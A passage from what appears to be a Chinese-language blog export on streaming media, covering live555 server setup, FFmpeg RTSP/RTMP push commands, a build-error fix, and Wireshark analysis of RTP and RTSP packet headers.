support)</span></span><br><span class="line"><span class="string">	".vob" =&gt; a VOB (MPEG-2 video with AC-3 audio) file</span></span><br><span class="line"><span class="string">	".wav" =&gt; a WAV Audio file</span></span><br><span class="line"><span class="string">	".webm" =&gt; a WebM audio(Vorbis)+video(VP8) file</span></span><br><span class="line"><span class="string">See http://www.live555.com/mediaServer/ for additional documentation.</span></span><br><span class="line"><span class="string">(We use port 8000 for optional RTSP-over-HTTP tunneling, or for HTTP live streaming (for indexed Transport Stream files only).)</span></span><br><span class="line"><span class="string">``` </span></span><br><span class="line"><span class="string">在此目录放一个test.mkv文件，用VCL播放器打开 `http://192.168.0.223:8000/test.mkv` 或者 `rtsp://192.168.0.223:8554/test.mkv` 就能播放了。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">### 2.proxyServer </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">live555ProxyServer  rtsp流源地址 &amp;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">```sh</span></span><br><span class="line"><span class="string">$ cd proxyServer</span></span><br><span class="line"><span class="string">$ ./live555ProxyServer  rtsp://192.168.0.188:554/stream/main &amp; #执行命令后会返回一个分发的流地址</span></span><br><span class="line"><span class="string">./live555ProxyServer rtsp://192.168.0.188:554</span></span><br><span class="line"><span class="string">LIVE555 Proxy Server</span></span><br><span class="line"><span class="string">	(LIVE555 Streaming Media library version 2020.06.25; licensed under the GNU LGPL)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Created new TCP socket 4 for connection</span></span><br><span class="line"><span class="string">RTSP stream, proxying the stream "rtsp://192.168.0.188:554"</span></span><br><span class="line"><span class="string">	Play this stream using the URL: rtsp://192.168.0.223:8554/proxyStream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(We use port 8000 for optional RTSP-over-HTTP tunneling.)</span></span><br></pre></td></tr></table></figure>
<h3 id="3-test"><a href="#3-test" class="headerlink" title="3. test"></a>3. test</h3><p>拷贝一个.264测试视频文件到/live/testProgs目录下，<a href="http://www.live555.com/liveMedia/public/264/" target="_blank" rel="noopener">live555网站</a>可以下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./testOnDemanRTSPServer</span><br><span class="line">&quot;mpeg4ESVideoTest&quot; stream, from the file &quot;test.m4e&quot;</span><br><span class="line">Play this stream using the URL &quot;rtsp://192.168.0.226:8554/mpeg4ESVideoTest&quot;</span><br><span class="line"></span><br><span class="line">&quot;h264ESVideoTest&quot; stream, from the file &quot;test.264&quot;</span><br><span class="line">Play this stream using the URL &quot;rtsp://192.168.0.226:8554/h264ESVideoTest&quot;</span><br><span class="line"></span><br><span class="line">&quot;h265ESVideoTest&quot; stream, from the file &quot;test.265&quot;</span><br><span class="line">Play this stream using the URL &quot;rtsp://192.168.0.226:8554/h265ESVideoTest&quot;</span><br><span class="line"></span><br><span class="line">&quot;mpeg1or2AudioVideoTest&quot; stream, from the file &quot;test.mpg&quot;</span><br><span class="line">Play this stream using the URL &quot;rtsp://192.168.0.226:8554/mpeg1or2AudioVideoTest&quot;</span><br><span class="line"></span><br><span class="line">&quot;mpeg1or2ESVideoTest&quot; stream, from the file &quot;testv.mpg&quot;</span><br><span class="line">Play this stream using the URL &quot;rtsp://192.168.0.226:8554/mpeg1or2ESVideoTest&quot;</span><br><span class="line"></span><br><span class="line">&quot;mp3AudioTest&quot; stream, from the file &quot;test.mp3&quot;</span><br><span class="line">Play this stream using the URL &quot;rtsp://192.168.0.226:8554/mp3AudioTest&quot;</span><br><span class="line"></span><br><span class="line">&quot;wavAudioTest&quot; stream, from the file &quot;test.wav&quot;</span><br><span class="line">Play this stream using the URL &quot;rtsp://192.168.0.226:8554/wavAudioTest&quot;</span><br><span class="line"></span><br><span class="line">&quot;amrAudioTest&quot; stream, from the file &quot;test.amr&quot;</span><br><span class="line">Play this stream using the URL &quot;rtsp://192.168.0.226:8554/amrAudioTest&quot;</span><br><span class="line"></span><br><span class="line">&quot;vobTest&quot; stream, from the file &quot;test.vob&quot;</span><br><span class="line">Play this stream using the URL &quot;rtsp://192.168.0.226:8554/vobTest&quot;</span><br><span class="line"></span><br><span class="line">&quot;mpeg2TransportStreamTest&quot; stream, from the file &quot;test.ts&quot;</span><br><span class="line">Play this stream using the URL &quot;rtsp://192.168.0.226:8554/mpeg2TransportStreamTest&quot;</span><br><span class="line"></span><br><span class="line">&quot;aacAudioTest&quot; stream, from the file &quot;test.aac&quot;</span><br><span class="line">Play this stream using the URL &quot;rtsp://192.168.0.226:8554/aacAudioTest&quot;</span><br><span class="line"></span><br><span class="line">&quot;dvVideoTest&quot; stream, from the file &quot;test.dv&quot;</span><br><span class="line">Play this stream using the URL &quot;rtsp://192.168.0.226:8554/dvVideoTest&quot;</span><br><span class="line"></span><br><span class="line">&quot;ac3AudioTest&quot; stream, from the file &quot;test.ac3&quot;</span><br><span class="line">Play this stream using the URL &quot;rtsp://192.168.0.226:8554/ac3AudioTest&quot;</span><br><span class="line"></span><br><span class="line">&quot;matroskaFileTest&quot; stream, from the file &quot;test.mkv&quot;</span><br><span class="line">Play this stream using the URL &quot;rtsp://192.168.0.226:8554/matroskaFileTest&quot;</span><br><span class="line"></span><br><span class="line">&quot;webmFileTest&quot; stream, from the file &quot;test.webm&quot;</span><br><span class="line">Play this stream using the URL &quot;rtsp://192.168.0.226:8554/webmFileTest&quot;</span><br><span class="line"></span><br><span class="line">&quot;oggFileTest&quot; stream, from the file &quot;test.ogg&quot;</span><br><span class="line">Play this stream using the URL &quot;rtsp://192.168.0.226:8554/oggFileTest&quot;</span><br><span class="line"></span><br><span class="line">&quot;opusFileTest&quot; stream, from the file &quot;test.opus&quot;</span><br><span class="line">Play this stream using the URL &quot;rtsp://192.168.0.226:8554/opusFileTest&quot;</span><br><span class="line"></span><br><span class="line">&quot;mpeg2TransportStreamFromUDPSourceTest&quot; stream, from a UDP Transport Stream input source </span><br><span class="line">	(IP multicast address 239.255.42.42, port 1234)</span><br><span class="line">Play this stream using the URL &quot;rtsp://192.168.0.226:8554/mpeg2TransportStreamFromUDPSourceTest&quot;</span><br><span class="line"></span><br><span class="line">(We use port 8000 for optional RTSP-over-HTTP tunneling.)</span><br></pre></td></tr></table></figure>
<p>用VCL播放器打开 <code>rtsp://192.168.0.226:8554/h264ESVideoTest</code> </p>
<h3 id="错误解决"><a href="#错误解决" class="headerlink" title="错误解决"></a>错误解决</h3><p>缺少ssl<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include/TLSState.hh:31:10: fatal error: openssl/ssl.h: No such file or directory</span><br><span class="line"> #include &lt;openssl/ssl.h&gt;</span><br><span class="line">          ^~~~~~~~~~~~~~~</span><br><span class="line">compilation terminated.</span><br><span class="line">Makefile:32: recipe for target &apos;RTSPServer.o&apos; failed</span><br><span class="line">make[1]: *** [RTSPServer.o] Error 1</span><br><span class="line">make[1]: Leaving directory &apos;/home/cn/live/liveMedia&apos;</span><br><span class="line">Makefile:35: recipe for target &apos;all&apos; failed</span><br><span class="line">make: *** [all] Error 2</span><br></pre></td></tr></table></figure></p>
<p>解决：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">centos</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo yum install openssl-devel</span></span><br><span class="line"><span class="meta">#</span><span class="bash">ubuntu</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install libssl-dev</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>音视频</category>
      </categories>
      <tags>
        <tag>live555</tag>
      </tags>
  </entry>
  <entry>
    <title>RTP网络抓包分析</title>
    <url>/%E9%9F%B3%E8%A7%86%E9%A2%91/RTP%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="RTP-Over-UDP"><a href="#RTP-Over-UDP" class="headerlink" title="RTP Over UDP"></a>RTP Over UDP</h3><p>这是rtmp-rtsp-stream-client-java发出的包<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">80600396000cf6ae0ce9d37f|我是分隔符|7c85b8141ff1c6921a6ba385c00040056dd92a7ccbeb7e38000837470001067fff1fc3177b46c9c731d84f1e6b6f6ff6fc763b09e21dfe9df6dbc8b84f176dbfe9db4d3b68efff8f1c444b8fca76b5da32e13cda7476ffff477fc47e3c53ebad78fc20f47edf6fe3ffa3fffff3ff043afe1edee6b04a600b730c899d05e4d4dffba8ba5f3adab44c59e08ded760e63763eda138901d3c527ffedff09e0854eb3b7ffe3bef09fd013dfb7ffe9be1d7a32430a449f19848276060df0f31fe941ff8a8976a7039b22b8d910300043c1c004254905641cf077c3c9ed77812f89043040be9a437b35b520bf448436f46f48c000401817b8f391571dc96f9f8515c3225034d14963b27feab77e6a3e8e7722e93bf6bda10b439fbee0f8afa2887e21c776f75fb8c50fff9f50caa27ddf2f17de9e690f29a9780eef43e6b031805184fce2e27feb480fb577381cace9e2bbaf378354bd524c3a3c45812dc55528ee47b8a78ab2f228bddf5372c7964bd0781f5cb673f2dbd45cfe8fc00e8675e64aaca76d34cdbaa6993c69c69c5df77bb0cf48a7ba41457cb8f6d42728128ecd69f2d1b7fdbffc89e3ebe78cbbe90bb557dc8fa006e3e8593fb7f5d3b65a8347e7ffd757e21558f4b17ac009c887912807061fdc1d87e56cfffcd951823d6e8d28060f7038a1605115c154bc0bcec0e77cfbc17ae34e6cf9b2b7641dd1f4e3e5dfff0f060a7bf595121372efffdbd2de14a9c908826749655109894930c25b0cb20fc30327a7ffc2b8973fff6e54b221f641354a50ffffe8e7485551a7fffca8c832481117a78fffdb6d05fd3edf171153a44cb24d580c9862259a3152f54e1565d4694eda2a32519e5ffbbfa88afe7cd956bd2f516f74fffa21042c4e12421c2112488a2a11b4da4055a564a7b022561f103175bd441f8f73fc3d4474f8e62d71bc4c1dc6c6cd295df1690870f73aa0efad48c09f7ec5203c0954554ba7f0a312006e3bd03fbacf6ff9518c1ed5bccb3c49106c150b6bc14c5216e9ab42bfb48cb8d958eb59641482a2946928541f04f49fd74e3b4ea8e67b78147940b2d3813f275f5744028cad6a0d27369bd6b8e6ddf4ae5ea34ac977795b69afa9888a2dc7c657b8428e7f510f971c3d035d0ee31ee67a6185555ceb6610c896d16c32cd8c857bedf56aaf58a49a1e68f28875bedf4bd083601f0ada56fffffe7d61d07fd650b7e045246963c6aa9d28ed1ccf9e37c584401664a2f8e92c711f055b7b52d9d89dc02f7e48280553ca1c2d52cf20159a824cb6fb7eb60971384a9ff7b954807714fcb880952c102ed4fd32af30ce6032668ad447dfae2425f10c04dfcfea34116c1565385b99728679581c8d23dbb18bdf90abeae6fbfa94ca18f486feb34d660bec5c5d76b54db986731a0857db65250c82d293b16060802c1c1037464d9b3709ecf5b770ca586800821738c93c4588a64b80d33292b3ec07c461c7e840bda57c18f4403615df6de9012a2b60b7e066105e60f30aee1506dbc2c4f2b8c89201b293a8fa61dd3d3804498c8c48643c80724573fb77238f65116824d336be409c8ec6a290344368394a6bd00a5872d4107ff54b09eb398c061f5e0c81283da0afdbf06686a383fab987254b835d095f2cabcbe0eaae9c4c03d7286ada203e607156d0d3a9b6f9f9a0034211effb7c0392a47214afbef9ffda37102e821292af133105d4c33b5ddbf0b1ba4e609422f878e94831e6f6909391292a41daafd076146581226a148afcfa1395062fa8</span><br></pre></td></tr></table></figure></p>
<p>分隔符前面是 <code>rtp header</code> 后面是 <code>rtp payload</code> 也就是H264的NAL，这部分可能有三种情况：单NAL，聚合NAL，分包NAL</p>
<h5 id="FU-A"><a href="#FU-A" class="headerlink" title="FU-A"></a>FU-A</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 0                   1                   2                   3</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">| FU indicator  |   FU header   |                               |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+                               |</span><br><span class="line">|                                                               |</span><br><span class="line">|                         FU payload                            |</span><br><span class="line">|                                                               |</span><br><span class="line">|                               +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                               :...OPTIONAL RTP padding        |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line"></span><br><span class="line">图 14.  FU-A的RTP荷载格式</span><br></pre></td></tr></table></figure>
<p>FU-A分包NAL，payload的前面两个字节携带信息  <code>FU indicator</code> 和  <code>FU header</code>，如示例中的包：</p>
<p><strong> FU indicator = 7c (01111100) </strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------+</span><br><span class="line">|0|1|2|3|4|5|6|7|</span><br><span class="line">+-+-+-+-+-+-+-+-+</span><br><span class="line">|F|NRI|  Type   |</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure>
<p>F|NRI 和 NAL的F|NRI相同，Type规定为28(11100)</p>
<blockquote>
<p>F 占1bit，是禁止位，规定为0<br>NRI 占2bit，它的取值范围在0~3，值越大，表示这个Nal越重要</p>
</blockquote>
<p><strong> FU header = 85(10000101) </strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------+</span><br><span class="line">|0|1|2|3|4|5|6|7|</span><br><span class="line">+-+-+-+-+-+-+-+-+</span><br><span class="line">|S|E|R|  Type   |</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure></p>
<ul>
<li>S: 1 bit<br>当值等于1,开始位指示分片NAL单元的第一个包。非第一个包为0。</li>
<li>E: 1 bit<br>当值等于1, 最后一个包，是否为0。</li>
<li>R: 1 bit<br>保留位必须设置为0，接收者必须忽略该位。</li>
<li>Type: 5 bits<br>NAL的Type，示例中 <code>00101</code> = 5, 即是I帧。</li>
</ul>
<p>非I帧 FU header常见值：<br>81 -&gt; 1 0 0 00001  第一个包<br>01 -&gt; 0 0 0 00001  中间包<br>41 -&gt; 0 1 0 00001  最后一个包</p>
<p>I帧 FU header常见值：<br>85 -&gt; 1 0 0 00101 第一个包<br>05 -&gt; 0 0 0 00101 中间包<br>45 -&gt; 0 1 0 00101 最后一个包</p>
]]></content>
      <categories>
        <category>音视频</category>
      </categories>
  </entry>
  <entry>
    <title>FFmpeg推流RTSP和RTMP</title>
    <url>/%E9%9F%B3%E8%A7%86%E9%A2%91/ffmpeg%E6%8E%A8%E6%B5%81RTSP/</url>
    <content><![CDATA[<h2 id="RTSP推流到本地"><a href="#RTSP推流到本地" class="headerlink" title="RTSP推流到本地"></a>RTSP推流到本地</h2><p>用UDP传输<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ffmpeg -re -i h264.mp4 -vcodec copy -f h264 udp://127.0.0.1:8554</span><br><span class="line"></span><br><span class="line"><span class="comment">#循环文件推流（默认UDP）</span></span><br><span class="line">ffmpeg -re  -stream_loop -1 -i move.mp4 -vcodec copy -codec copy -f rtsp rtsp://192.168.0.223:554/<span class="built_in">test</span>/</span><br><span class="line"><span class="comment">#循环文件推流（指定TCP）</span></span><br><span class="line">ffmpeg -re  -stream_loop -1 -i move.mp4 -vcodec copy -codec copy -rtsp_transport tcp -f rtsp rtsp://192.168.0.223:554/<span class="built_in">test</span>/</span><br></pre></td></tr></table></figure></p>
<p>在本地用ffplay播放（ffplay是ffmpeg的附带命令行工具）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ffplay  udp://127.0.0.1:8554</span><br><span class="line">$ ffplay -f h264 udp://127.0.0.1:8554</span><br></pre></td></tr></table></figure></p>
<h2 id="RTMP推流到服务器"><a href="#RTMP推流到服务器" class="headerlink" title="RTMP推流到服务器"></a>RTMP推流到服务器</h2><p>推流<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ffmpeg -re -i h264.mp4 -f flv rtmp://192.168.0.123:1935/live/<span class="built_in">test</span></span><br></pre></td></tr></table></figure></p>
<p>播放<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ffplay -fflags nobuffer rtmp://192.168.0.123:1935/live/<span class="built_in">test</span></span><br></pre></td></tr></table></figure></p>
<h2 id="中转服务ffserver"><a href="#中转服务ffserver" class="headerlink" title="中转服务ffserver"></a>中转服务ffserver</h2><blockquote>
<p>ffserver has been removed on 2018-01-06 ，在3.4版本中已经从ffmpeg移除。</p>
</blockquote>
<p><a href="https://blog.csdn.net/cug_heshun2013/article/details/79518632" target="_blank" rel="noopener">【ffserver搭建流媒体服务】</a></p>
]]></content>
      <categories>
        <category>音视频</category>
      </categories>
  </entry>
  <entry>
    <title>使用fmod模仿QQ变声特效-NDK</title>
    <url>/%E9%9F%B3%E8%A7%86%E9%A2%91/%E4%BD%BF%E7%94%A8fmod%E6%A8%A1%E4%BB%BFQQ%E5%8F%98%E5%A3%B0%E7%89%B9%E6%95%88-NDK/</url>
    <content><![CDATA[<p><a href="http://www.jianshu.com/p/99a2ad03cd58" target="_blank" rel="noopener">http://www.jianshu.com/p/99a2ad03cd58</a></p>
]]></content>
      <categories>
        <category>音视频</category>
      </categories>
  </entry>
  <entry>
    <title>较全的直播技术导航</title>
    <url>/%E9%9F%B3%E8%A7%86%E9%A2%91/%E8%BE%83%E5%85%A8%E7%9A%84%E7%9B%B4%E6%92%AD%E6%8A%80%E6%9C%AF%E5%AF%BC%E8%88%AA/</url>
    <content><![CDATA[<p>较全的直播技术导航<br><a href="https://github.com/DyncLang/DevLiveBook" target="_blank" rel="noopener">https://github.com/DyncLang/DevLiveBook</a></p>
<ul>
<li><a href="http://www.jianshu.com/p/b61cd0bc2abe" target="_blank" rel="noopener">关于视频直播技术，你想要知道的都在这里了（三）编码和封装</a></li>
</ul>
]]></content>
      <categories>
        <category>音视频</category>
      </categories>
  </entry>
  <entry>
    <title>RTSP网络抓包分析</title>
    <url>/%E9%9F%B3%E8%A7%86%E9%A2%91/RTSP%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<blockquote>
<p>抓包文件在附件中…</p>
</blockquote>
<h3 id="一、Play-抓包-Over-TCP"><a href="#一、Play-抓包-Over-TCP" class="headerlink" title="一、Play 抓包 Over TCP"></a>一、Play 抓包 Over TCP</h3><ul>
<li>推流Client端rtmp-rtsp-stream-client-java</li>
<li>server端EasyDarwin</li>
<li>播放Client端 Javacv 录制（ <strong>这里用Wireshark抓包</strong> ）</li>
</ul>
<p>tcp追踪流<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">OPTIONS rtsp://192.168.0.223:554/<span class="built_in">test</span>/ RTSP/1.0</span><br><span class="line">CSeq: 1</span><br><span class="line">User-Agent: Lavf58.12.100</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">CSeq: 1</span><br><span class="line">Session: PoC0zKnGR</span><br><span class="line">Public: DESCRIBE, SETUP, TEARDOWN, PLAY, PAUSE, OPTIONS, ANNOUNCE, RECORD</span><br><span class="line"></span><br><span class="line">DESCRIBE rtsp://192.168.0.223:554/<span class="built_in">test</span>/ RTSP/1.0</span><br><span class="line">Accept: application/sdp</span><br><span class="line">CSeq: 2</span><br><span class="line">User-Agent: Lavf58.12.100</span><br><span class="line">Session: PoC0zKnGR</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">CSeq: 2</span><br><span class="line">Session: PoC0zKnGR</span><br><span class="line">Content-Length: 444</span><br><span class="line"></span><br><span class="line">v=0</span><br><span class="line">o=- 0 0 IN IP4 127.0.0.1</span><br><span class="line">s=Unnamed</span><br><span class="line">i=N/A</span><br><span class="line">c=IN IP4 192.168.0.223</span><br><span class="line">t=0 0</span><br><span class="line">a=recvonly</span><br><span class="line">m=video 0 RTP/AVP 96</span><br><span class="line">a=rtpmap:96 H264/90000</span><br><span class="line">a=fmtp:96 packetization-mode=1;sprop-parameter-sets=Z0LAHtoHgUSAeEAhUA==,aM48gA==;</span><br><span class="line">a=control:trackID=1</span><br><span class="line">m=audio 0 RTP/AVP 96</span><br><span class="line">a=rtpmap:96 MPEG4-GENERIC/32000/2</span><br><span class="line">a=fmtp:96 streamtype=5; profile-level-id=15; mode=AAC-hbr; config=1290; SizeLength=13; IndexLength=3; IndexDeltaLength=3;</span><br><span class="line">a=control:trackID=0</span><br><span class="line">SETUP rtsp://192.168.0.223:554/<span class="built_in">test</span>/trackID=1 RTSP/1.0</span><br><span class="line">Transport: RTP/AVP/TCP;unicast;interleaved=0-1</span><br><span class="line">CSeq: 3</span><br><span class="line">User-Agent: Lavf58.12.100</span><br><span class="line">Session: PoC0zKnGR</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">CSeq: 3</span><br><span class="line">Session: PoC0zKnGR</span><br><span class="line">Transport: RTP/AVP/TCP;unicast;interleaved=0-1</span><br><span class="line"></span><br><span class="line">SETUP rtsp://192.168.0.223:554/<span class="built_in">test</span>/trackID=0 RTSP/1.0</span><br><span class="line">Transport: RTP/AVP/TCP;unicast;interleaved=2-3</span><br><span class="line">CSeq: 4</span><br><span class="line">User-Agent: Lavf58.12.100</span><br><span class="line">Session: PoC0zKnGR</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">CSeq: 4</span><br><span class="line">Session: PoC0zKnGR</span><br><span class="line">Transport: RTP/AVP/TCP;unicast;interleaved=2-3</span><br><span class="line"></span><br><span class="line">PLAY rtsp://192.168.0.223:554/<span class="built_in">test</span>/ RTSP/1.0</span><br><span class="line">Range: npt=0.000-</span><br><span class="line">CSeq: 5</span><br><span class="line">User-Agent: Lavf58.12.100</span><br><span class="line">Session: PoC0zKnGR</span><br><span class="line"></span><br><span class="line">RTSP/1.0 200 OK</span><br><span class="line">CSeq: 5</span><br><span class="line">Session: PoC0zKnGR</span><br><span class="line">Range: npt=0.000-</span><br><span class="line"></span><br><span class="line"><span class="comment">#这是紧接着一帧一帧rtp包（rtp over tcp）</span></span><br><span class="line">701ce71cfb29c8ff28ed6843080045000524c1c240004006f1c3c0a800dfc0a8001e022ae383d37e23f074458e0a501800feecab0000240004f88060447500bd14102e9f0a407c85b803f06fe00f0e157e880381bc15565f8c35982ddba36a0312c81fd3800a814eb570c928a7818974f2303f010e39d505ae59ae3ebb42bbe706078d36e0997a0e00020011c000fff70000fea1d04f4480006968249f20dad1f9b600a5b19018a3c169c190e22c754f401f5cb5f3a4fa0736d00d6cbcb19670584cc24d248c1c51ef552de01e01807565e81e0ce8185fc160dbbeea53228011496146e44add661440a93ca0b20a0e6b2455413b9964320ed088f5cb751a24effc030f6b65c1d423a60fcf96247b9e7de03c0ef60020a1d76ad07eab06ad7584bfea63cfc9f5af1516029898299d30daa09cbff265002a099de41d7fa2262cc9a2957e885747b2bfd24b95583fd2007b1dc8060c63d0f9cb6000201a7968ad6b1eb03fc4932ee1efbc13b7a1ef52167acab89f939b0d039dad33c4b541c6ee759e541591f309071a007c130ffd1801818830226664c4db87bc2a00342111c8a630a654263ac5856721e37ed483ab31f8fa7a6797d9135039ffdfffa121bf11d0f440a84cbf443d5c9edd00010114f1c8298d5ad50b189ec1da94250a4826c50f3620d9da18cdffffb8ea614710240104fe5fa6886924bcc0d76987aa095427a80a08e13f0b935ca244c4ed4ff43b4ce7cd881a403cf8932bbffff695047712c3e0b19448ad5405308200306a59632f0a50e9a7a488da16040ece88915077f4299c947fff0794c028eba019c1036e548ce347af0cc3b1a18448fbaca4a4adaa8efd7b06f5be2dc1e7daec2ca97e2070654438fc5fe8dd06e0d30400f6fa7e09acc0c889df44c0a9cfda3c70f1cd3e0c9adcb6e208141e03bdfafd780400a3a3bf0f72fab2f7df9f8d0c701ff82c2105b6e2bcd85ea95fba2f79bbfd03539e2b4c412951d0bd4bf0581855cbcff519f54bd70d41c3b0a2f9bbe5fcf8aae3e87146bbe3c793a202ec6a5f5524a38c7fa7b6df5e90476add0f23a1539f71a2bdb6928320a0a01bdeb58527002d97c3826fcfdf7a6dc9e9a79909d71489e700531cc90d2f252aa97a97e9c1431a76fa785f03b42e60ee9f97fa6dedd63450c29b6f4d34fe3eb5c6b1d556ec510f6b6e6c8e31fede9a7ddfa939b8a9ad15b07e1e911cf2b358b776ee90de750f21b78eb8ad4ecc9c9859576c89856d2238b2feb87ca0a07f5f98bd655755bf2f6e66cb13c5b9cda6b50d605ddc4921c7a69f6fcf80aac42aaac56d5c98d6ec6b9f1e90d3183e9fc46623829bfef4b37de2d6d6d170c862ada69edb71f7723a98e6ad4bd289f42dfcb9cd90dd43cfdbd530a4e028320cdc846dd36e9ff6db77ffb8be74a93c98cce6c37ee9ca9ff1abd7d33b92dddd4d8ffaf2e0b703c21c342837a3460a8fe2002dae062608045068ace00a404e19d8d080527c354e368ce82406ab26eb61b0018c3b9991b036c07153560b53840bd0398c01e01e1c129b5b2e0efc55e32bae349338fa42a8a8c31427df5c18abc6f2f36aae5b55c78a648a6b4e3fdacd931184ea59d1e64cda61c0c0b2fb65e3ab07d70ff4b8988488acf3b25d56fa3039c123b28eff95e380c8dee9530e128920d476f47b28867b80fbb4e96af68a781b7e8bb9663c0130f8f752c7c9bbea0090e3e99b7797ff124528fc31a950e5fc651b85bdedf5ea5daa5ca41e2c2e7940ecb8e58448133afe9acaa6fb63badd2930240346a6eeda99aabb44822a41351c75d0725e36ad4d1fdc1086dbb9e6a5ee416d2df2ee372317b9541c6612d94cbb61357b2be0e37f981772c3880e02e2f4cc47e866</span><br></pre></td></tr></table></figure></p>
<p><code>240004f88060447500bd14102e9f0a40</code> 这一段 <code>rtp over tcp</code> 的头信息</p>
<p><code>240004f8</code> 是 RTSP Interleaved Frame （RTSP交错帧头）</p>
<blockquote>
<p>rtp over tcp 发送时要加这四个字节：</p>
<p>第一个字节Magic是 ‘$’ 符号；</p>
<p>第二个字节channel在rtsp的setup时获取；</p>
<p>第三、四个字节是rtp包的大小，第三个字节高4位，第四个字节保存低8位，最大12位。</p>
</blockquote>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Magic</span>: 0x24</span><br><span class="line"><span class="attribute">Channel</span>: 0x00</span><br><span class="line"><span class="attribute">Length</span>: 1272</span><br></pre></td></tr></table></figure>
<p><code>8060447500bd14102e9f0a40</code> 是 RTP 头</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">10.. .... = Version: RFC 1889 Version (2)</span><br><span class="line">..0. .... = Padding: False</span><br><span class="line">...0 .... = Extension: False</span><br><span class="line">.... 0000 = Contributing source identifiers count: 0</span><br><span class="line">0... .... = Marker: False</span><br><span class="line">Payload type: DynamicRTP-Type-96 (96)</span><br><span class="line">Sequence number: 17525</span><br><span class="line"><span class="attribute">Timestamp</span>: 12391440</span><br><span class="line">Synchronization Source identifier: 0x2e9f0a40 (782174784)</span><br></pre></td></tr></table></figure>
<p><code>80-60-4475-00bd1410-2e9f0a40</code> 五组数据一个一个分析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0               1               2               3</span><br><span class="line">7 6 5 4 3 2 1 0 |7 6 5 4 3 2 1 0|7 6 5 4 3 2 1 0| 7 6 5 4 3 2 1 0</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|V=2|P|X|  CC   |M|     PT      |       sequence number         |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|                           timestamp                           |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">|           synchronization source (SSRC) identifier            |</span><br><span class="line">+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+</span><br><span class="line">|            contributing source (CSRC) identifiers             |</span><br><span class="line">|                             ....                              |</span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line"></span><br><span class="line">Figure 1.  RTP header according to RFC 3550</span><br></pre></td></tr></table></figure>
<ul>
<li>版本号(V)：2Bit，用来标志使用RTP版本</li>
<li>填充位：1Bit，如果该位置位，则该RTP包的尾部就包含填充的附加字节</li>
<li>扩展位(X)：1Bit，如果该位置位，则该RTP包的固定头部后面就跟着一个扩展头部</li>
<li>CSRC技术器(CC)：4Bit，含有固定头部后面跟着的CSRC的数据</li>
</ul>
<ul>
<li>标记位(M)：1Bit，该位的解释由配置文档来承担</li>
<li>载荷类型(PT)：7Bit，标识了RTP载荷的类型</li>
</ul>
<ul>
<li>序列号(SN)：16Bit，发送方在每发送完一个RTP包后就将该域的值增加1，可以由该域检测包的丢失及恢复包的序列。序列号的初始值是随机的。</li>
</ul>
<ul>
<li>时间戳timestamp：32比特，记录了该包中数据的第一个字节的采样时刻</li>
</ul>
<ul>
<li>同步源标识符(SSRC)：32比特，同步源就是RTP包源的来源。在同一个RTP会话中不能有两个相同的SSRC值</li>
</ul>
<ul>
<li>贡献源列表(CSRC List)：0-15项，每项32比特，这个不常用，可以不用。</li>
</ul>
<ol>
<li><p>0x80 是指二进制位的值（10000000）</p>
